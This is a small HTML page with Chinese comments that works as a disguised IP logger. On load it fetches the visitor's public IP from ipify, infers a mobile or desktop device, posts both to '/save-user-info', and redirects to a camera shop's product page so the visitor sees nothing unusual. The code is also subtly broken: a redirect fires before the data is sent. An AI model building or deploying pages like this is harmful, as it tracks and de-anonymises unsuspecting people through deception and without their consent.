<!DOCTYPE html>
<html>
<head>
    <title>紀錄網站</title>
</head>
<body>
    
    <p>IP地址是: <span id="ipAddress"></span></p>
    <p>設備類型: <span id="deviceType"></span></p>

    <script>
        // 获取用户的IP地址
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                var ipAddress = data.ip;
                document.getElementById('ipAddress').textContent = ipAddress;

                // 获取用户设备类型
                var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? '手機' : '桌面设备';
                document.getElementById('deviceType').textContent = deviceType;
                window.location.href ='https://www.bigcamera.com.tw/goods_view.php?no=7388'
                // 发送IP地址和设备类型到服务器
                sendToServer(ipAddress, deviceType);
            })
            .catch(error => {
                console.error('无法获取IP地址:', error);
            });

        // 向服务器发送IP地址和设备类型
        function sendToServer(ipAddress, deviceType) {
            // 使用AJAX或其他服务器端脚本将数据发送到服务器
            // 这里只是示范，具体的实现取决于你的服务器环境和需求
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/save-user-info', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({ ipAddress: ipAddress, deviceType: deviceType }));

            // 当服务器成功响应后，进行页面重定向
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    window.location.href = 'https://www.bigcamera.com.tw/goods_view.php?no=7388'; // 将此链接替换为您要重定向的网站
                }
            };
        }
    </script>
</body>
</html>
